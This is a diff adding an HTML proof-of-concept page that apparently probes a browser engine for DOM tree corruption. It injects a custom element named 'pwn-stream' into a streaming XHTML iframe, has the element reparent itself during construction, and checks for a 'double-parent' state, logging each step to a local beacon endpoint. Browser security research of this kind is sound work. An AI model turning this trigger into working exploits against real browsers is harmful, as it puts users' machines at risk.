@@ -1,0 +1,220 @@
+<!doctype html>
+<html><head><title>V417</title></head><body>
+<script>
+var BQ=0;
+function B(t,d){try{var x=new XMLHttpRequest();x.open('POST','/beacon/V417-'+t+'?t='+Date.now()+'&q='+(BQ++),false);x.send(d||'');}catch(e){}}
+B('BOOT');
+
+// T1: Main-frame XHTML script execution test
+// Navigate an iframe to clean XHTML to check if scripts execute in non-iframe context
+// Actually, we test in iframe first, then main frame via delayed redirect
+var f1=document.createElement('iframe');
+f1.style.cssText='width:1px;height:1px;position:absolute;left:-9999px';
+f1.onload=function(){
+  B('T1-LOADED');
+  try{
+    var w=f1.contentWindow;
+    var d=f1.contentDocument;
+    B('T1-WIN-'+(w?'Y':'N'));
+    B('T1-DOC-'+(d?'Y':'N'));
+    if(d){
+      B('T1-DOCEL-'+(d.documentElement?d.documentElement.nodeName:'NULL'));
+      try{B('T1-BODY-'+(d.body?'Y':'NULL'));}catch(e){B('T1-BODY-ERR');}
+      try{
+        var ns=d.getElementsByTagNameNS('http://www.w3.org/1999/xhtml','body');
+        B('T1-NSBODY-'+ns.length);
+      }catch(e){B('T1-NSBODY-ERR');}
+      // Try querySelector
+      try{
+        var qs=d.querySelector('body');
+        B('T1-QS-'+(qs?'Y':'N'));
+      }catch(e){B('T1-QS-ERR');}
+      // Try eval
+      try{
+        var r=w.eval('1+1');
+        B('T1-EVAL-'+r);
+      }catch(e){B('T1-EVAL-ERR-'+String(e).substring(0,50));}
+    }
+    // Check if contentWindow.customElements exists
+    try{
+      B('T1-CE-API-'+(w.customElements?'Y':'N'));
+    }catch(e){B('T1-CE-API-ERR');}
+  }catch(e){
+    B('T1-ERR-'+String(e).substring(0,50));
+  }
+  runT2();
+};
+f1.src='p416-xhtml-ns.xhtml';
+document.body.appendChild(f1);
+
+function runT2(){
+  // T2: Streaming XHTML CE injection
+  // Create iframe to /slow-xhtml which sends XHTML in two chunks
+  // Between chunks, we inject CEs onto the iframe's window
+  B('T2-START');
+  var f2=document.createElement('iframe');
+  f2.style.cssText='width:1px;height:1px;position:absolute;left:-9999px';
+  var ceInjected=false;
+  var ctorFired=false;
+  var reparentOK=false;
+
+  // Poll iframe.contentWindow to inject CE as soon as window is available
+  var pollCount=0;
+  var pollMax=100;
+  var pollIv=setInterval(function(){
+    pollCount++;
+    if(pollCount>pollMax){
+      clearInterval(pollIv);
+      B('T2-POLL-TIMEOUT');
+      return;
+    }
+    try{
+      var w2=f2.contentWindow;
+      if(!w2||!w2.customElements){return;}
+      if(ceInjected){return;}
+
+      // Check if this is the XHTML document (not about:blank)
+      var d2=f2.contentDocument;
+      if(!d2||d2.URL==='about:blank'){return;}
+      B('T2-POLL-'+pollCount+'-URL-'+String(d2.URL).substring(0,60));
+
+      // Define CE with reparenting constructor
+      try{
+        var IH=w2.HTMLElement;
+        var sinkDiv=null;
+        // Try to find the sink div in the XHTML document
+        if(d2){
+          try{
+            var divs=d2.getElementsByTagNameNS('http://www.w3.org/1999/xhtml','div');
+            for(var i=0;i<divs.length;i++){
+              if(divs[i].getAttribute&&divs[i].getAttribute('id')==='sink'){
+                sinkDiv=divs[i];break;
+              }
+            }
+          }catch(e){}
+        }
+        if(!sinkDiv){
+          // Create our own sink in the XHTML doc
+          try{
+            sinkDiv=d2.createElementNS('http://www.w3.org/1999/xhtml','div');
+            sinkDiv.setAttribute('id','injected-sink');
+            if(d2.documentElement){
+              d2.documentElement.appendChild(sinkDiv);
+              B('T2-SINK-INJECTED');
+            }
+          }catch(e){
+            B('T2-SINK-INJECT-ERR-'+String(e).substring(0,40));
+          }
+        }
+        if(!sinkDiv){
+          // Fallback: use a div in the main document
+          sinkDiv=document.createElement('div');
+          sinkDiv.id='fallback-sink';
+          document.body.appendChild(sinkDiv);
+          B('T2-USING-FALLBACK-SINK');
+        }
+
+        w2.customElements.define('pwn-stream',class extends IH{
+          constructor(){
+            super();
+            ctorFired=true;
+            B('T2-CTOR-FIRE');
+            try{
+              sinkDiv.appendChild(this);
+              reparentOK=true;
+              B('T2-REPARENT-OK');
+            }catch(e){
+              B('T2-REPARENT-ERR-'+String(e).substring(0,40));
+            }
+          }
+        });
+        ceInjected=true;
+        B('T2-CE-INJECTED-POLL-'+pollCount);
+      }catch(e){
+        B('T2-CE-DEF-ERR-'+String(e).substring(0,50));
+      }
+    }catch(e){
+      // Expected: cross-origin or not-ready errors during polling
+    }
+  },50);
+
+  f2.onload=function(){
+    clearInterval(pollIv);
+    B('T2-LOADED');
+    B('T2-CE-WAS-INJECTED-'+(ceInjected?'Y':'N'));
+    B('T2-CTOR-FIRED-'+(ctorFired?'Y':'N'));
+    B('T2-REPARENT-'+(reparentOK?'Y':'N'));
+
+    if(ctorFired){
+      // Check for double-parent corruption
+      try{
+        var d2=f2.contentDocument;
+        if(d2){
+          var elems=d2.getElementsByTagNameNS('http://www.w3.org/1999/xhtml','pwn-stream');
+          if(elems.length===0)elems=d2.querySelectorAll('pwn-stream');
+          B('T2-FOUND-ELEMS-'+elems.length);
+          for(var j=0;j<elems.length;j++){
+            var el=elems[j];
+            B('T2-ELEM'+j+'-PARENT-'+(el.parentNode?(el.parentNode.getAttribute&&el.parentNode.getAttribute('id'))||el.parentNode.nodeName:'NULL'));
+          }
+          // Walk parent containers for double-parent check
+          var hostDiv=null;
+          var sinkDiv=null;
+          var divs=d2.getElementsByTagNameNS('http://www.w3.org/1999/xhtml','div');
+          for(var k=0;k<divs.length;k++){
+            var id=divs[k].getAttribute('id');
+            if(id==='host')hostDiv=divs[k];
+            if(id==='sink'||id==='injected-sink')sinkDiv=divs[k];
+          }
+          if(hostDiv&&sinkDiv){
+            var inHost=false,inSink=false;
+            for(var c=hostDiv.firstChild;c;c=c.nextSibling){
+              if(c.nodeName==='pwn-stream'||c.nodeName==='PWN-STREAM')inHost=true;
+            }
+            for(var c2=sinkDiv.firstChild;c2;c2=c2.nextSibling){
+              if(c2.nodeName==='pwn-stream'||c2.nodeName==='PWN-STREAM')inSink=true;
+            }
+            B('T2-IN-HOST-'+(inHost?'Y':'N'));
+            B('T2-IN-SINK-'+(inSink?'Y':'N'));
+            if(inHost&&inSink){
+              B('T2-DOUBLE-PARENT-CONFIRMED');
+            }
+          }else{
+            B('T2-HOST-'+(hostDiv?'Y':'N')+'-SINK-'+(sinkDiv?'Y':'N'));
+          }
+        }
+      }catch(e){
+        B('T2-CHECK-ERR-'+String(e).substring(0,50));
+      }
+    }
+
+    // T3: Main-frame XHTML navigation test
+    B('T3-REDIRECT-TO-XHTML');
+    setTimeout(function(){
+      window.location.href='p417-xhtml-main.xhtml';
+    },500);
+  };
+  f2.src='/slow-xhtml';
+  f2.onerror=function(){
+    B('T2-LOAD-ERROR');
+    // /slow-xhtml not active, skip to T3
+    B('T3-REDIRECT-TO-XHTML');
+    setTimeout(function(){
+      window.location.href='p417-xhtml-main.xhtml';
+    },500);
+  };
+  // Timeout fallback if /slow-xhtml hangs or 404s without triggering events
+  setTimeout(function(){
+    if(!ceInjected){
+      clearInterval(pollIv);
+      B('T2-TIMEOUT-FALLBACK');
+      B('T3-REDIRECT-TO-XHTML');
+      setTimeout(function(){
+        window.location.href='p417-xhtml-main.xhtml';
+      },500);
+    }
+  },8000);
+  document.body.appendChild(f2);
+}
+</script>
+</body></html>
